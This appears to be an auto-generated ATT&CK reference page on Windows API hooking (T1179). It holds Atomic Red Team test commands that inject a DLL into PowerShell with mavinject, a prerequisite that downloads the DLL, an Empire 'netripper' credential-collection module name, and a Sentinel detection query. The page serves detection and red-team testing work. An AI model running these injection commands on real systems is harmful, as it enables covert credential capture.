
# Hooking

## Description

### MITRE Description

> Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. 

Hooking involves redirecting calls to these functions and can be implemented via:

* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Endgame Process Injection July 2017)
* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored. (Citation: Endgame Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)
* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow. (Citation: Endgame Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)

Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.

Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)

Hooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s to conceal files, processes, Registry keys, and other objects in order to hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1179

## Potential Commands

```
mavinject $pid /INJECTRUNNING PathToAtomicsFolder\T1179\bin\T1179x64.dll
curl #{server_name}

mavinject $pid /INJECTRUNNING #{file_name}
curl https://www.example.com

powershell/collection/netripper
powershell/collection/netripper
```

## Commands Dataset

```
[{'command': 'mavinject $pid /INJECTRUNNING '
             'PathToAtomicsFolder\\T1179\\bin\\T1179x64.dll\n'
             'curl #{server_name}\n',
  'name': None,
  'source': 'atomics/T1179/T1179.yaml'},
 {'command': 'mavinject $pid /INJECTRUNNING #{file_name}\n'
             'curl https://www.example.com\n',
  'name': None,
  'source': 'atomics/T1179/T1179.yaml'},
 {'command': 'powershell/collection/netripper',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/netripper',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Windows event logs']},
 {'data_source': ['Sysmon ID 7', 'DLL monitoring']},
 {'data_source': ['Sysmon - ID 7', 'Loaded DLLs']},
 {'data_source': ['API monitoring']},
 {'data_source': ['Binary file metadata']},
 {'data_source': ['Sysmon ID 7', 'DLL monitoring']},
 {'data_source': ['Sysmon - ID 7', 'Loaded DLLs']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Windows event logs']},
 {'data_source': ['API monitoring']},
 {'data_source': ['Binary file metadata']}]
```

## Potential Queries

```json
[{'name': 'Hooking',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_path contains '
           '"mavinject.exe"or process_command_line contains "/INJECTRUNNING")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Hooking': {'atomic_tests': [{'auto_generated_guid': 'de1934ea-1fbf-425b-8795-65fb27dd7e33',
                                                       'dependencies': [{'description': 'T1179x64.dll '
                                                                                        'must '
                                                                                        'exist '
                                                                                        'on '
                                                                                        'disk '
                                                                                        'at '
                                                                                        'specified '
                                                                                        'location '
                                                                                        '(#{file_name})\n',
                                                                         'get_prereq_command': 'New-Item '
                                                                                               '-Type '
                                                                                               'Directory '
                                                                                               '(split-path '
                                                                                               '#{file_name}) '
                                                                                               '-ErrorAction '
                                                                                               'ignore '
                                                                                               '| '
                                                                                               'Out-Null\n'
                                                                                               'Invoke-WebRequest '
                                                                                               '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1179/bin/T1179x64.dll" '
                                                                                               '-OutFile '
                                                                                               '"#{file_name}"\n',
                                                                         'prereq_command': 'if '
                                                                                           '(Test-Path '
                                                                                           '#{file_name}) '
                                                                                           '{exit '
                                                                                           '0} '
                                                                                           'else '
                                                                                           '{exit '
                                                                                           '1}\n'}],
                                                       'dependency_executor_name': 'powershell',
                                                       'description': 'Hooks '
                                                                      'functions '
                                                                      'in '
                                                                      'PowerShell '
                                                                      'to read '
                                                                      'TLS '
                                                                      'Communications\n',
                                                       'executor': {'command': 'mavinject '
                                                                               '$pid '
                                                                               '/INJECTRUNNING '
                                                                               '#{file_name}\n'
                                                                               'curl '
                                                                               '#{server_name}\n',
                                                                    'elevation_required': True,
                                                                    'name': 'powershell'},
                                                       'input_arguments': {'file_name': {'default': 'PathToAtomicsFolder\\T1179\\bin\\T1179x64.dll',
                                                                                         'description': 'Dll '
                                                                                                        'To '
                                                                                                        'Inject',
                                                                                         'type': 'Path'},
                                                                           'server_name': {'default': 'https://www.example.com',
                                                                                           'description': 'TLS '
                                                                                                          'Server '
                                                                                                          'To '
                                                                                                          'Test '
                                                                                                          'Get '
                                                                                                          'Request',
                                                                                           'type': 'Url'}},
                                                       'name': 'Hook '
                                                               'PowerShell TLS '
                                                               'Encrypt/Decrypt '
                                                               'Messages',
                                                       'supported_platforms': ['windows']}],
                                     'attack_technique': 'T1179',
                                     'display_name': 'Hooking'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1179',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/netripper":  '
                                                                                 '["T1179"],',
                                            'Empire Module': 'powershell/collection/netripper',
                                            'Technique': 'Hooking'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)

* [Persistence](../tactics/Persistence.md)
    
* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations

None

# Actors


* [PLATINUM](../actors/PLATINUM.md)

